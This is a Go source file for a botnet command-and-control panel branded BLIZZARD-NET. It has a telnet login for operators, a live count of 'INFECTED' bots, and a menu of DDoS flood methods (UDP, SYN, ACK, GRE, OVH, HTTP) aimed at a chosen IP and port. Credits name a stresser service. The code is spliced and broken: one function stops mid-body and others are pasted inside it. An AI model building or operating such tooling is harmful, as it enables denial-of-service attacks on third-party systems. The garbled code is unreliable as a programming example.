
package main

import (
    "bufio"
    "fmt"
    "os"
    "strings"
)


func main() {
    reader := bufio.NewReader(os.Stdin)
    showStartup()
    for {
        fmt.Print("\x1b[1;36muser\x1b[0;37m@\x1b[1;31mBLIZZARDNET\x1b[0;37m~# \033[0m")
        cmd, _ := reader.ReadString('\n')
        cmd = strings.TrimSpace(cmd)
        switch strings.ToLower(cmd) {
        case "clear", "cls", "c":
            showStartup()
        case "help", "?":
            showHelp()
        case "methods":
            showMethods()
        case "admin":
            showAdmin()
        case "credits":
            showCredits()
        case "exit", "quit":
            return
        case "":
            continue
        default:
            fmt.Println("Unknown command. Type 'help' for available commands.")
        }
    }
}

func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.Write([]byte("\033[01;36mLOGIN\033[01;36m | BLIZZARD-NET\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;96mUsername\033[37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[0;96mPassword\033[37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;36mChecking login.. \033[01;36mPlease wait \033[01;37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(300) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))

    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
        this.conn.Write([]byte("\033[2J\033[1;1H"))
        this.conn.Write([]byte("\r\033[91m[!] Invalid login!\r\n"))
        this.conn.Write([]byte("\033[91mPress any key to exit\033[0m"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }

    this.conn.Write([]byte("\r\n\033[0m"))
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;%d INFECTED | User: [%s]\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1;1H")) 
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\x1b[1;36m ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗ ██████╗		\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0m ██╔══██╗██║     ██║╚══███╔╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗		\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[90m ██████╔╝██║     ██║  ███╔╝   ███╔╝ ███████║██████╔╝██║  ██║      \x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[1;36m ██╔══██╗██║     ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██╗██║  ██║		\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[0m ██████╔╝███████╗██║███████╗███████╗██║  ██║██║  ██║██████╔╝		\x1b[0m \r\n"))
    this.conn.Write([]byte("\x1b[90m ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝		\x1b[0m \r\n"))
    this.conn.Write([]byte("\r\n"))
    this.conn.Write([]byte("\r\n"))


    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\x1b[1;36m" + username + "\x1b[0;37m@\x1b[1;31mBLIZZARDNET\x1b[0;37m~# \033[0m"))
        cmd, err := this.ReadLine(false)

        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        if cmd == "" {
            continue
        }
        
            if cmd == "clear" || cmd == "cls" || cmd == "c" {
                this.conn.Write([]byte("\033[2J\033[1H"))
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\x1b[1;36m ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗ ██████╗		\x1b[0m \r\n"))
                this.conn.Write([]byte("\x1b[0m ██╔══██╗██║     ██║╚══███╔╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗		\x1b[0m \r\n"))
                this.conn.Write([]byte("\x1b[90m ██████╔╝██║     ██║  ███╔╝   ███╔╝ ███████║██████╔╝██║  ██║      \x1b[0m \r\n"))
                this.conn.Write([]byte("\x1b[1;36m ██╔══██╗██║     ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██╗██║  ██║		\x1b[0m \r\n"))
                this.conn.Write([]byte("\x1b[0m ██████╔╝███████╗██║███████╗███████╗██║  ██║██║  ██║██████╔╝		\x1b[0m \r\n"))
                this.conn.Write([]byte("\x1b[90m ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝		\x1b[0m \r\n"))
                this.conn.Write([]byte("\r\n"))
                this.conn.Write([]byte("\r\n"))
                continue
            }
        
            if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu

// ASCII art and menu functions
func showStartup() {
    fmt.Print("\033[2J\033[1;1H")
    fmt.Print("\r\n")
    fmt.Print("\x1b[1;36m ██████╗ ██╗     ██╗███████╗███████╗ █████╗ ██████╗ ██████╗\t\t\x1b[0m \r\n")
    fmt.Print("\x1b[0m ██╔══██╗██║     ██║╚══███╔╝╚══███╔╝██╔══██╗██╔══██╗██╔══██╗\t\t\x1b[0m \r\n")
    fmt.Print("\x1b[90m ██████╔╝██║     ██║  ███╔╝   ███╔╝ ███████║██████╔╝██║  ██║      \x1b[0m \r\n")
    fmt.Print("\x1b[1;36m ██╔══██╗██║     ██║ ███╔╝   ███╔╝  ██╔══██║██╔══██╗██║  ██║\t\t\x1b[0m \r\n")
    fmt.Print("\x1b[0m ██████╔╝███████╗██║███████╗███████╗██║  ██║██║  ██║██████╔╝\t\t\x1b[0m \r\n")
    fmt.Print("\x1b[90m ╚═════╝ ╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝\t\t\x1b[0m \r\n")
    fmt.Print("\r\n\r\n")
}

func showHelp() {
    fmt.Print("\033[01;37m ╔-════════════════════════════════════-╗   \033[0m \r\n")
    fmt.Print("\033[01;37m ║ \033[01;36m METHODS : \033[01;37mATTACK PUSSY    \033[01;37m  ║   \033[0m \r\n")
    fmt.Print("\033[01;37m ║ \033[01;36m ADMIN : \033[01;37mADD ADMIN    \033[01;37m║   \033[0m \r\n")
    fmt.Print("\033[01;37m ║ \033[01;36m BOTS : \033[01;37mNUMBER BOTS    \033[01;37m   ║   \033[0m \r\n")
    fmt.Print("\033[01;37m ║ \033[01;36m CREDITS : \033[01;37mCREDITS   \033[01;37m ║   \033[0m \r\n")
    fmt.Print("\033[01;37m ║ \033[01;36m CLS/CLEAR : \033[01;37mCLEAR TERMINAL    \033[01;37m ║   \033[0m \r\n")
    fmt.Print("\033[01;37m ╚-════════════════════════════════════-╝ \033[0m \r\n")
}

func showMethods() {
    fmt.Print("\033[01;36m     -> | BLIZZARD-NET | <- \r\n")
    fmt.Print("\033[01;31m ╔-════════════════════════════════════════════-╗   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m udp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m vse [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m dns [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m syn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m ack [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m stomp [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m greip [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m              ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m std [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m] len=[\033[01;37m1400\033[01;37m]\033[01;31m║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m udpplain [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m           ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m xmas [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m               ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m ovh [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m                ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m asyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m    \t\t║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m usyn [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] dport=[\033[01;37mport\033[01;37m]\033[01;31m\t\t║   \033[0m \r\n")
    fmt.Print("\033[01;31m ║ \033[01;37m http [\033[01;37mip\033[01;37m] [\033[01;37mtime\033[01;37m] domain=[\033[01;37mDOMAIN\033[01;37m] conns=5000\033[01;31m ║   \033[0m \r\n")
    fmt.Print("\033[01;31m ╚-════════════════════════════════════════════-╝   \033[0m \r\n")
}

func showAdmin() {
    fmt.Print("\033[01;37m ╔-═════════════════════════════════-╗\r\n")
    fmt.Print("\033[01;37m ║ \033[01;31madduser -> \033[01;37mAdd normal user  \033[01;37m║\r\n")
    fmt.Print("\033[01;37m ╚-═════════════════════════════════-╝  \r\n")
}

func showCredits() {
    fmt.Print("\033[01;37m ╔-═════════════════════════════════-╗\r\n")
    fmt.Print("\033[01;37m ║ \033[01;31mOwner: \033[01;37mBLIZZARD-STRESSER.WTF\t      \033[01;37m║\r\n")
    fmt.Print("\033[01;37m ║ \033[01;31mDeveloper: \033[01;37mRootSec\t      \033[01;37m║\r\n")
    fmt.Print("\033[01;37m ╚-═════════════════════════════════-╝  \r\n")
}
            }
